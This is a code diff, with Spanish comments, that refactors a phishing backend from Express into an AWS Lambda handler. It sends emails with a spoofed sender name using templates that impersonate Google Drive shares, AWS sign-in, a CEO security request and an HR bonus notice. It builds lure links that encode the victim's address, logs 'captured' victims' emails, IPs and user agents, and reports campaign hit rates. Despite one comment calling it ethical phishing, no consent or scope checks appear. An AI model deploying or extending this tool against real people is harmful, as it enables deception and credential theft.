@@ -1,21 +1,13 @@
-import express from 'express';
-import cors from 'cors';
-import nodemailer from 'nodemailer';
-import dotenv from 'dotenv';
+const nodemailer = require('nodemailer');
+const dotenv = require('dotenv');
 
 dotenv.config();
 
-const app = express();
-
-// Arrays en memoria para logs (simple para Lambda)
+// Arrays en memoria para logs
 let campaignsLog = [];
 let victimsLog = [];
 
-// Middleware
-app.use(cors());
-app.use(express.json());
-
-// Configuración SMTP desde variables de entorno
+// Configuración SMTP
 const smtpConfig = {
   host: process.env.SMTP_HOST,
   port: parseInt(process.env.SMTP_PORT),
@@ -26,10 +18,9 @@ const smtpConfig = {
   }
 };
 
-// Crear transporter de nodemailer
 const transporter = nodemailer.createTransport(smtpConfig);
 
-// Plantillas de correo (traducidas del PHP)
+// Plantillas de correo
 const plantillas = {
   drive: {
     asunto: '📎 Documento importante compartido contigo',
@@ -125,7 +116,7 @@ const plantillas = {
   }
 };
 
-// Función para registrar en memoria
+// Función para registrar logs
 function registrarLog(tipo, datos) {
   const timestamp = new Date().toISOString();
   const entry = {
@@ -144,40 +135,108 @@ function registrarLog(tipo, datos) {
   console.log(`${tipo}:`, entry);
 }
 
-// Endpoint para enviar correos de phishing
-app.post('/api/send-phishing', async (req, res) => {
+// Handler principal
+exports.handler = async (event, context) => {
+  console.log('Event:', JSON.stringify(event, null, 2));
+  
+  const method = event.requestContext.http.method;
+  const path = event.rawPath;
+  
+  // Headers CORS
+  const corsHeaders = {
+    'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+    'Access-Control-Allow-Headers': 'Content-Type'
+  };
+  
+  // Manejar OPTIONS (CORS preflight)
+  if (method === 'OPTIONS') {
+    return {
+      statusCode: 200,
+      headers: corsHeaders,
+      body: ''
+    };
+  }
+  
   try {
-    const { destinatario, nombreObjetivo, remitenteFalso, asunto, tipoPlantilla } = req.body;
-    
-    // Validar datos
-    if (!destinatario || !nombreObjetivo || !remitenteFalso || !tipoPlantilla) {
-      return res.status(400).json({ error: 'Faltan campos requeridos' });
+    // Parsear body si existe
+    let body = {};
+    if (event.body) {
+      body = JSON.parse(event.body);
     }
     
-    // URLs de captura con rutas creíbles según plantilla
-    const rutasCreibles = {
-      drive: `/drive/share/document?id=${Buffer.from(destinatario).toString('base64')}&access=view`,
-      aws: `/console/signin?redirect=${Buffer.from(destinatario).toString('base64')}&region=us-east-1`,
-      ceo: `/security/verify-account?token=${Buffer.from(destinatario).toString('base64')}&urgent=true`,
-      rh: `/portal/rh/bonos?employee=${Buffer.from(destinatario).toString('base64')}&year=2024`
-    };
-    
-    const urlTrampa = `${process.env.BASE_URL}${rutasCreibles[tipoPlantilla]}&type=${tipoPlantilla}`;
-    
-    // Obtener plantilla
-    const plantilla = plantillas[tipoPlantilla];
-    if (!plantilla) {
-      return res.status(400).json({ error: 'Tipo de plantilla inválido' });
+    // Routing manual
+    if (method === 'POST' && (path === '/api/send-phishing' || path === '/prod/api/send-phishing')) {
+      return await handleSendPhishing(body, corsHeaders);
     }
     
-    // Configurar correo
-    const mailOptions = {
-      from: `"${remitenteFalso}" <${smtpConfig.auth.user}>`,
-      to: destinatario,
-      subject: asunto || plantilla.asunto,
-      html: plantilla.cuerpo(nombreObjetivo, remitenteFalso, urlTrampa)
+    if (method === 'POST' && (path === '/api/capture' || path === '/prod/api/capture')) {
+      return await handleCapture(body, corsHeaders);
+    }
+    
+    if (method === 'GET' && (path === '/api/stats' || path === '/prod/api/stats')) {
+      return await handleStats(corsHeaders);
+    }
+    
+    // Ruta no encontrada
+    return {
+      statusCode: 404,
+      headers: corsHeaders,
+      body: JSON.stringify({ error: 'Ruta no encontrada' })
     };
     
+  } catch (error) {
+    console.error('Error:', error);
+    return {
+      statusCode: 500,
+      headers: corsHeaders,
+      body: JSON.stringify({ error: 'Error interno del servidor' })
+    };
+  }
+};
+
+// Handler para enviar phishing
+async function handleSendPhishing(body, corsHeaders) {
+  const { destinatario, nombreObjetivo, remitenteFalso, asunto, tipoPlantilla } = body;
+  
+  // Validar datos
+  if (!destinatario || !nombreObjetivo || !remitenteFalso || !tipoPlantilla) {
+    return {
+      statusCode: 400,
+      headers: corsHeaders,
+      body: JSON.stringify({ error: 'Faltan campos requeridos' })
+    };
+  }
+  
+  // URLs de captura
+  const rutasCreibles = {
+    drive: `/drive/share/document?id=${Buffer.from(destinatario).toString('base64')}&access=view`,
+    aws: `/console/signin?redirect=${Buffer.from(destinatario).toString('base64')}&region=us-east-1`,
+    ceo: `/security/verify-account?token=${Buffer.from(destinatario).toString('base64')}&urgent=true`,
+    rh: `/portal/rh/bonos?employee=${Buffer.from(destinatario).toString('base64')}&year=2024`
+  };
+  
+  const urlTrampa = `${process.env.BASE_URL}${rutasCreibles[tipoPlantilla]}&type=${tipoPlantilla}`;
+  
+  // Obtener plantilla
+  const plantilla = plantillas[tipoPlantilla];
+  if (!plantilla) {
+    return {
+      statusCode: 400,
+      headers: corsHeaders,
+      body: JSON.stringify({ error: 'Tipo de plantilla inválido' })
+    };
+  }
+  
+  // Configurar correo
+  const mailOptions = {
+    from: `"${remitenteFalso}" <${smtpConfig.auth.user}>`,
+    to: destinatario,
+    subject: asunto || plantilla.asunto,
+    html: plantilla.cuerpo(nombreObjetivo, remitenteFalso, urlTrampa)
+  };
+  
+  try {
     // Enviar correo
     await transporter.sendMail(mailOptions);
     
@@ -188,66 +247,59 @@ app.post('/api/send-phishing', async (req, res) => {
       tipoPlantilla
     });
     
-    res.json({ 
-      success: true, 
-      message: `✅ Correo enviado exitosamente a: ${destinatario}` 
-    });
-    
+    return {
+      statusCode: 200,
+      headers: corsHeaders,
+      body: JSON.stringify({ 
+        success: true, 
+        message: `✅ Correo enviado exitosamente a: ${destinatario}` 
+      })
+    };
   } catch (error) {
     console.error('Error enviando correo:', error);
-    res.status(500).json({ 
-      error: '❌ Error al enviar el correo. Verifica la configuración SMTP.' 
-    });
+    return {
+      statusCode: 500,
+      headers: corsHeaders,
+      body: JSON.stringify({ 
+        error: '❌ Error al enviar el correo. Verifica la configuración SMTP.' 
+      })
+    };
   }
-});
+}
 
-// Endpoint para registrar capturas (cuando alguien cae en el phishing)
-app.post('/api/capture', (req, res) => {
-  try {
-    const { email, ip, userAgent, plantilla } = req.body;
-    
-    registrarLog('CAPTURADO', {
-      email,
-      ip,
-      userAgent,
-      plantilla
-    });
-    
-    res.json({ success: true });
-  } catch (error) {
-    console.error('Error registrando captura:', error);
-    res.status(500).json({ error: 'Error registrando captura' });
-  }
-});
+// Handler para capturar víctimas
+async function handleCapture(body, corsHeaders) {
+  const { email, ip, userAgent, plantilla } = body;
+  
+  registrarLog('CAPTURADO', {
+    email,
+    ip,
+    userAgent,
+    plantilla
+  });
+  
+  return {
+    statusCode: 200,
+    headers: corsHeaders,
+    body: JSON.stringify({ success: true })
+  };
+}
 
-// Endpoint para obtener estadísticas
-app.get('/api/stats', (req, res) => {
-  try {
-    const enviados = campaignsLog.length;
-    const capturados = victimsLog.length;
-    const efectividad = enviados > 0 ? ((capturados / enviados) * 100).toFixed(1) : 0;
-    
-    res.json({
+// Handler para estadísticas
+async function handleStats(corsHeaders) {
+  const enviados = campaignsLog.length;
+  const capturados = victimsLog.length;
+  const efectividad = enviados > 0 ? ((capturados / enviados) * 100).toFixed(1) : 0;
+  
+  return {
+    statusCode: 200,
+    headers: corsHeaders,
+    body: JSON.stringify({
       enviados,
       capturados,
       efectividad: `${efectividad}%`,
       campaigns: campaignsLog,
       victims: victimsLog
-    });
-  } catch (error) {
-    console.error('Error obteniendo estadísticas:', error);
-    res.status(500).json({ error: 'Error obteniendo estadísticas' });
-  }
-});
-
-// Exportar app para Lambda
-export default app;
-
-// Para desarrollo local
-if (process.argv[1] === new URL(import.meta.url).pathname) {
-  const PORT = process.env.PORT || 3001;
-  app.listen(PORT, () => {
-    console.log(`🚀 Backend de phishing ético ejecutándose en puerto ${PORT}`);
-    console.log(`📧 SMTP configurado para: ${smtpConfig.auth.user}`);
-  });
+    })
+  };
 }
